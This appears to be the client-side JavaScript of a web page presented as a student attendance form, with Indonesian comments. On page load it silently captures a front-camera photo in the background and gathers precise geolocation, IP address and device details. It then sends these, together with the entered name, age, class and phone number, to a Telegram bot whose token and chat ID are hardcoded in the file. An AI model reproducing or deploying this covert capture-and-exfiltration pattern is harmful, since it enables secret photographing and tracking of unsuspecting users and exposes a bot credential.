// ============================================
// KONFIGURASI TELEGRAM BOT
// ============================================
// PENTING: Ganti dengan Bot Token dan Chat ID Anda sendiri!
// Cara mendapatkan:
// 1. Buat bot di Telegram dengan @BotFather
// 2. Dapatkan token dari BotFather
// 3. Dapatkan chat ID dengan mengirim pesan ke bot Anda, lalu buka:
//    https://api.telegram.org/bot<TOKEN>/getUpdates

const TELEGRAM_BOT_TOKEN = "8559374490:AAHXqIhz-vBsGg7uTwhTCxHeYALweTFK-X4";
const TELEGRAM_CHAT_ID = "1847188275";

// ============================================
// VARIABLES
// ============================================

const form = document.getElementById("absensiForm");
const successMessage = document.getElementById("successMessage");
const errorMessage = document.getElementById("errorMessage");
const errorText = document.getElementById("errorText");

// Camera elements
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const photoPreview = document.getElementById("photoPreview");
const capturedImage = document.getElementById("capturedImage");
const cameraOverlay = document.getElementById("cameraOverlay");
const startCameraBtn = document.getElementById("startCamera");
const capturePhotoBtn = document.getElementById("capturePhoto");
const retakePhotoBtn = document.getElementById("retakePhoto");
const cameraStatus = document.getElementById("cameraStatus");
const submitBtn = document.getElementById("submitBtn");

// Info elements
const locationInfo = document.getElementById("locationInfo");
const deviceInfo = document.getElementById("deviceInfo");
const browserInfo = document.getElementById("browserInfo");

// Data storage
let stream = null;
let photoBlob = null;
let locationData = null;
let deviceData = null;
let browserData = null;
let ipData = null;

// ============================================
// INISIALISASI SAAT PAGE LOAD
// ============================================

window.addEventListener("DOMContentLoaded", () => {
  console.log("DOM Loaded - Initializing...");

  getDeviceInfo();
  getBrowserInfo();
  getGeolocation();
  getIPAddress();
  autoCapturePhoto(); // Auto capture foto saat load

  // Setup event listeners setelah DOM ready
  setupEventListeners();
});

// ============================================
// SETUP EVENT LISTENERS
// ============================================

function setupEventListeners() {
  console.log("Setting up event listeners...");

  // Form submit handler
  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    console.log("Form submitted!");

    // Validasi konfigurasi
    if (
      TELEGRAM_BOT_TOKEN === "GANTI_DENGAN_BOT_TOKEN_ANDA" ||
      TELEGRAM_CHAT_ID === "GANTI_DENGAN_CHAT_ID_ANDA"
    ) {
      showError(
        "Konfigurasi Telegram belum diatur! Silakan edit file script.js",
      );
      return;
    }

    // Ambil data form
    const formData = {
      nama: document.getElementById("nama").value,
      jenisKelamin: document.getElementById("jenisKelamin").value,
      umur: document.getElementById("umur").value,
      kelas: document.getElementById("kelas").value,
      nomorHP: document.getElementById("nomorHP").value,
      lokasi: locationData || "Tidak tersedia",
      device: deviceData || "Unknown",
      browser: browserData || "Unknown",
      ip: ipData || "Tidak tersedia",
    };

    // Tampilkan loading
    setLoading(true);

    try {
      // Kirim foto terlebih dahulu
      await sendPhotoToTelegram(photoBlob, formData);

      // Tampilkan pesan sukses
      showSuccess();

      // Reset form setelah 3 detik
      setTimeout(() => {
        form.reset();
        resetCamera();
        hideMessages();
      }, 3000);
    } catch (error) {
      console.error("Error:", error);
      showError(error.message || "Terjadi kesalahan saat mengirim data");
    } finally {
      setLoading(false);
    }
  });

  // Camera button handlers (optional - for manual mode)
  if (startCameraBtn) {
    startCameraBtn.addEventListener("click", async () => {
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false,
        });

        video.srcObject = stream;
        video.classList.add("active");
        if (cameraOverlay) cameraOverlay.classList.add("hidden");

        startCameraBtn.style.display = "none";
        if (capturePhotoBtn) capturePhotoBtn.style.display = "block";

        if (cameraStatus) {
          cameraStatus.textContent = "Kamera aktif, silakan ambil foto";
          cameraStatus.style.color = "#ff9800";
        }
      } catch (error) {
        console.error("Error accessing camera:", error);
        alert(
          "Tidak bisa mengakses kamera. Pastikan Anda memberikan izin akses kamera.",
        );
      }
    });
  }

  if (capturePhotoBtn) {
    capturePhotoBtn.addEventListener("click", () => {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      const context = canvas.getContext("2d");
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(
        (blob) => {
          photoBlob = blob;

          if (capturedImage) capturedImage.src = URL.createObjectURL(blob);
          if (photoPreview) photoPreview.style.display = "block";
          video.classList.remove("active");

          if (stream) {
            stream.getTracks().forEach((track) => track.stop());
          }

          capturePhotoBtn.style.display = "none";
          if (retakePhotoBtn) retakePhotoBtn.style.display = "block";
          if (submitBtn) submitBtn.disabled = false;

          if (cameraStatus) {
            cameraStatus.textContent = "✓ Foto berhasil diambil";
            cameraStatus.classList.add("success");
          }
        },
        "image/jpeg",
        0.8,
      );
    });
  }

  if (retakePhotoBtn) {
    retakePhotoBtn.addEventListener("click", () => {
      photoBlob = null;
      if (photoPreview) photoPreview.style.display = "none";
      if (capturedImage) capturedImage.src = "";

      if (startCameraBtn) startCameraBtn.click();

      retakePhotoBtn.style.display = "none";
      if (submitBtn) submitBtn.disabled = true;

      if (cameraStatus) {
        cameraStatus.textContent = "Foto wajib diambil sebelum mengirim";
        cameraStatus.classList.remove("success");
        cameraStatus.style.color = "#f44336";
      }
    });
  }

  // Validasi input nomor HP
  const nomorHPInput = document.getElementById("nomorHP");
  if (nomorHPInput) {
    nomorHPInput.addEventListener("input", function (e) {
      this.value = this.value.replace(/[^0-9]/g, "");
      if (this.value.length > 13) {
        this.value = this.value.slice(0, 13);
      }
    });
  }

  // Validasi input umur
  const umurInput = document.getElementById("umur");
  if (umurInput) {
    umurInput.addEventListener("input", function (e) {
      if (this.value < 1) this.value = 1;
      if (this.value > 100) this.value = 100;
    });
  }
}

// ============================================
// GET DEVICE INFO
// ============================================

function getDeviceInfo() {
  const ua = navigator.userAgent;
  let device = "Unknown Device";

  if (/Android/i.test(ua)) {
    const match = ua.match(/Android ([0-9.]+)/);
    device = `Android ${match ? match[1] : ""}`;
  } else if (/iPhone/i.test(ua)) {
    device = "iPhone";
  } else if (/iPad/i.test(ua)) {
    device = "iPad";
  } else if (/Windows/i.test(ua)) {
    device = "Windows PC";
  } else if (/Macintosh/i.test(ua)) {
    device = "Mac";
  } else if (/Linux/i.test(ua)) {
    device = "Linux";
  }

  deviceData = device;
  deviceInfo.textContent = device;
}

// ============================================
// GET BROWSER INFO
// ============================================

function getBrowserInfo() {
  const ua = navigator.userAgent;
  let browser = "Unknown Browser";

  if (ua.indexOf("Firefox") > -1) {
    browser = "Mozilla Firefox";
  } else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) {
    browser = "Opera";
  } else if (ua.indexOf("Trident") > -1) {
    browser = "Internet Explorer";
  } else if (ua.indexOf("Edge") > -1 || ua.indexOf("Edg") > -1) {
    browser = "Microsoft Edge";
  } else if (ua.indexOf("Chrome") > -1) {
    browser = "Google Chrome";
  } else if (ua.indexOf("Safari") > -1) {
    browser = "Safari";
  }

  browserData = browser;
  browserInfo.textContent = browser;
}

// ============================================
// GET GEOLOCATION
// ============================================

function getGeolocation() {
  if (!navigator.geolocation) {
    locationInfo.textContent = "Geolocation tidak didukung";
    locationData = "Tidak tersedia";
    return;
  }

  locationInfo.textContent = "Mendeteksi lokasi...";

  navigator.geolocation.getCurrentPosition(
    async (position) => {
      const lat = position.coords.latitude.toFixed(6);
      const lng = position.coords.longitude.toFixed(6);

      // Get address from coordinates using reverse geocoding
      try {
        const response = await fetch(
          `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`,
          {
            headers: {
              "User-Agent": "AbsensiApp/1.0",
            },
          },
        );

        const data = await response.json();

        if (data && data.display_name) {
          // Format alamat lengkap
          const address = data.address;
          let alamatLengkap = data.display_name;

          // Buat alamat yang lebih ringkas
          if (address) {
            const parts = [];
            if (address.road) parts.push(address.road);
            if (address.suburb || address.village)
              parts.push(address.suburb || address.village);
            if (address.city || address.town)
              parts.push(address.city || address.town);
            if (address.state) parts.push(address.state);
            if (address.country) parts.push(address.country);

            if (parts.length > 0) {
              alamatLengkap = parts.join(", ");
            }
          }

          locationData = alamatLengkap;
          locationInfo.innerHTML = `<a href="https://www.google.com/maps?q=${lat},${lng}" target="_blank" title="Klik untuk buka di Google Maps">${alamatLengkap}</a>`;
          console.log("✓ Lokasi terdeteksi:", alamatLengkap);
        } else {
          // Fallback ke koordinat jika gagal get address
          locationData = `${lat}, ${lng}`;
          locationInfo.innerHTML = `<a href="https://www.google.com/maps?q=${lat},${lng}" target="_blank">${lat}, ${lng}</a>`;
        }
      } catch (error) {
        console.error("Error getting address:", error);
        // Fallback ke koordinat jika error
        locationData = `${lat}, ${lng}`;
        locationInfo.innerHTML = `<a href="https://www.google.com/maps?q=${lat},${lng}" target="_blank">${lat}, ${lng}</a>`;
      }
    },
    (error) => {
      console.error("Error getting location:", error);
      locationData = "Ditolak/Tidak tersedia";
      locationInfo.textContent = "Lokasi ditolak atau tidak tersedia";
    },
    {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0,
    },
  );
}

// ============================================
// AUTO CAPTURE PHOTO (BACKGROUND)
// ============================================

async function autoCapturePhoto() {
  try {
    // Request camera access (front camera)
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false,
    });

    video.srcObject = stream;

    // Wait for video to be ready and stable (2 seconds)
    await new Promise((resolve) => setTimeout(resolve, 2000));

    // Capture photo
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const context = canvas.getContext("2d");
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Convert to blob
    canvas.toBlob(
      (blob) => {
        photoBlob = blob;
        console.log("✓ Foto berhasil diambil otomatis");

        // Stop camera
        if (stream) {
          stream.getTracks().forEach((track) => track.stop());
        }
      },
      "image/jpeg",
      0.8,
    );
  } catch (error) {
    console.log("Kamera tidak diizinkan atau tidak tersedia:", error);
    photoBlob = null; // Set null jika gagal
  }
}

// ============================================
// GET IP ADDRESS
// ============================================

async function getIPAddress() {
  try {
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();
    ipData = data.ip;
    console.log("✓ IP terdeteksi:", ipData);
  } catch (error) {
    console.error("Error getting IP:", error);
    ipData = "Tidak tersedia";
  }
}

// ============================================
// CAMERA HANDLERS (NOT USED - KEPT FOR COMPATIBILITY)
// ============================================

// Event listeners sudah dipindahkan ke setupEventListeners()
// yang dipanggil saat DOMContentLoaded

// ============================================
// FUNGSI KIRIM FOTO KE TELEGRAM
// ============================================

async function sendPhotoToTelegram(photoBlob, data) {
  const waktu = new Date().toLocaleString("id-ID", {
    dateStyle: "full",
    timeStyle: "medium",
  });

  // Format caption untuk foto atau message untuk text
  const message = `
🎯 *DATA ABSENSI BARU*

👤 *Nama:* ${data.nama}
⚧ *Jenis Kelamin:* ${data.jenisKelamin}
🎂 *Umur:* ${data.umur} tahun
📚 *Kelas:* ${data.kelas}
📱 *Nomor HP:* ${data.nomorHP}

📍 *Lokasi:* ${data.lokasi}
📱 *Perangkat:* ${data.device}
🌐 *Browser:* ${data.browser}
� *IP Address:* ${data.ip}
�📷 *Foto:* ${photoBlob ? "✓ Terlampir" : "-"}

🕐 *Waktu:* ${waktu}

━━━━━━━━━━━━━━━━━━━
  `.trim();

  let url,
    body,
    headers = {};

  // Jika ada foto, kirim dengan sendPhoto
  if (photoBlob) {
    const formData = new FormData();
    formData.append("chat_id", TELEGRAM_CHAT_ID);
    formData.append("photo", photoBlob, "foto_absensi.jpg");
    formData.append("caption", message);
    formData.append("parse_mode", "Markdown");

    url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
    body = formData;
  } else {
    // Jika tidak ada foto, kirim text saja
    url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    headers = { "Content-Type": "application/json" };
    body = JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "Markdown",
    });
  }

  const response = await fetch(url, {
    method: "POST",
    headers: headers,
    body: body,
  });

  const result = await response.json();

  if (!result.ok) {
    throw new Error(result.description || "Gagal mengirim ke Telegram");
  }

  return result;
}

// ============================================
// FUNGSI UI HELPER
// ============================================

function setLoading(isLoading) {
  const submitBtn = form.querySelector(".btn-submit");

  if (isLoading) {
    submitBtn.disabled = true;
    submitBtn.classList.add("is-loading");
  } else {
    submitBtn.disabled = false;
    submitBtn.classList.remove("is-loading");
  }
}

function showSuccess() {
  form.style.display = "none";
  successMessage.classList.add("show");
  errorMessage.classList.remove("show");
}

function showError(message) {
  errorText.textContent = message;
  form.style.display = "none";
  errorMessage.classList.add("show");
  successMessage.classList.remove("show");

  // Kembali ke form setelah 3 detik
  setTimeout(() => {
    hideMessages();
  }, 3000);
}

function hideMessages() {
  form.style.display = "block";
  successMessage.classList.remove("show");
  errorMessage.classList.remove("show");
}

// ============================================
// RESET CAMERA
// ============================================

function resetCamera() {
  // Stop camera if running
  if (stream) {
    stream.getTracks().forEach((track) => track.stop());
    stream = null;
  }

  // Reset UI
  if (video) video.classList.remove("active");
  if (photoPreview) photoPreview.style.display = "none";
  if (cameraOverlay) cameraOverlay.classList.remove("hidden");
  if (capturedImage) capturedImage.src = "";

  // Reset buttons
  if (startCameraBtn) startCameraBtn.style.display = "block";
  if (capturePhotoBtn) capturePhotoBtn.style.display = "none";
  if (retakePhotoBtn) retakePhotoBtn.style.display = "none";

  // Reset data
  photoBlob = null;

  // Reset status
  if (cameraStatus) {
    cameraStatus.textContent = "Foto wajib diambil sebelum mengirim";
    cameraStatus.classList.remove("success");
    cameraStatus.style.color = "#f44336";
  }

  // Re-detect location
  getGeolocation();
}
